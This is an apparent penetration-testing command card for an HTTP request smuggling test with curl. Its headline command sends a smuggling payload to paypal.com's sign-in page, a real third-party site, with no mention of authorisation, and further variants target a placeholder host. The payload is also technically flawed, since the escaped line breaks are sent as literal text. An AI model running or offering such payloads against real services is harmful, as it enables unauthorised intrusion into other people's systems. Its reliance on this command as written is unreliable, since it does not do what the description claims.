---
data: >-
  curl -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /signin
  HTTP/1.1\r\nHost: paypal.com" https://paypal.com/signin
tags:
  - http-request-smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a247d08b-ac63-46d4-85b9-4c2c98cd8b59
created_at: '2025-12-11T06:10:28.677Z'
updated_at: '2025-12-11T06:10:28.677Z'
verified: false
validated: true
submitted: true
---
# curl-http-smuggling

## Command

```bash
curl -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /signin HTTP/1.1\r\nHost: paypal.com" https://paypal.com/signin
```

## Description

This command uses curl to test for HTTP request smuggling by sending a chunked request that attempts to smuggle a second GET request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Transfer-Encoding: chunked"` | Enables chunked transfer for smuggling | Yes |
| `-d "payload"` | The smuggling payload data | Yes |

## Examples

### Basic Usage

```bash
curl -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com" https://target.com
```

### Advanced Usage

```bash
curl --http1.1 -H "Transfer-Encoding: chunked" -d "smuggling payload" https://target.com
```

## Expected Output

A response indicating desynchronization, such as an unexpected 200 OK or error from the smuggled request.

## Related

- [[commands/burp-request-manipulation]]
- [[procedures/Exploit-HTTP-Request-Smuggling-on-Frontend-Caching-Servers]]
